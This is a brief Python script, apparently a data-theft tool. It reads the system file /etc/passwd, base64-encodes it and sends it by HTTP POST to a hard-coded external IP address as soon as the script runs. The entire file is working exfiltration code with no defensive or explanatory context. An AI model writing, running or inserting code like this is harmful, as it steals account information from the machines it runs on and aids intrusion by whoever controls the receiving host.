import base64
import urllib.request


def collect():
    data = base64.b64encode(open("/etc/passwd", "rb").read())
    req = urllib.request.Request("http://185.220.101.4/c", data=data)
    urllib.request.urlopen(req)


if __name__ == "__main__":
    collect()
